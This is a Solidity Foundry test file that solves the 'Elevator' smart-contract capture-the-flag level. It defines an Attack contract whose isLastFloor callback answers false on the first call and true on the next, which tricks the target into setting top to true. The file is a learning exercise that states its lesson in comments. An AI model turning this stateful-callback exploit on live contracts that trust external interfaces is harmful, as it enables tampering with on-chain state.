// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/Elevator.sol";

/// @custom:win-condition 
// This elevator won't let you reach the top of your building. Right?

/// @custom:lesson-learned
// interfaces can be abused by malicious contracts

contract Attack is Building {
    uint256 private count = 0;

    function attack(Elevator _victim) external {
        _victim.goTo(1);
    }

    function isLastFloor(uint) external returns (bool) {
        count++;
        return count > 1;
    }
}

contract ElevatorSolvedTest is Test {

  Elevator public s_elevator;
  address payable s_user;

  function setUp() public {
    s_elevator = new Elevator();
    s_user = payable(vm.addr(1));
  }

  function testWinCondition() public {
    vm.startPrank(s_user);

    Attack attack = new Attack();
    attack.attack(s_elevator);

    assertEq(s_elevator.top(), true);
  }
 
}